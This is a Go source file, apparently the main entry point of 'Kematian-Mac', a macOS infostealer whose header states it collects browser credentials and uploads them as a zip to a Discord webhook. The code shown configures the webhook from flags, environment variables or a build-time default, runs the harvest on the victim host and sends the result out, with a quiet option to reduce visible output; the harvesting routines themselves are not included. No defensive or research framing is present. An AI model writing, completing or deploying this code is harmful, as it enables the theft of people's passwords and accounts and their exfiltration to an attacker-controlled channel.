// Kematian-Mac: standalone macOS harvest binary (from Kematian-main recovery engine).
// Collects browser credentials and related data, then uploads a zip to a Discord webhook.
package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"strings"
)

// Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
var defaultWebhook string

func main() {
	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
	quiet := flag.Bool("quiet", false, "minimal console output")
	flag.Parse()

	if runtime.GOOS != "darwin" {
		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
	}

	webhook := strings.TrimSpace(*webhookFlag)
	if webhook == "" {
		webhook = strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
	}
	if webhook == "" {
		webhook = strings.TrimSpace(os.Getenv("KEMATIAN_WEBHOOK_URL"))
	}
	if webhook == "" {
		webhook = strings.TrimSpace(defaultWebhook)
	}
	if webhook == "" {
		log.Fatal("discord webhook required: -webhook, DISCORD_WEBHOOK_URL, KEMATIAN_WEBHOOK_URL, or build-time defaultWebhook")
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "mac"
	}

	if !*quiet {
		log.Printf("[kematian] starting harvest on %s (%s/%s)", hostname, runtime.GOOS, runtime.GOARCH)
	}

	payload, err := runHarvest(hostname)
	if err != nil {
		log.Fatalf("[kematian] harvest failed: %v", err)
	}

	if err := uploadAllHarvest(webhook, hostname, payload, *quiet); err != nil {
		log.Fatalf("[kematian] upload failed: %v", err)
	}

	if !*quiet {
		log.Printf("[kematian] upload complete, exiting")
	}
	os.Exit(0)
}

func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := b.String()
	if out == "" {
		return "mac"
	}
	return out
}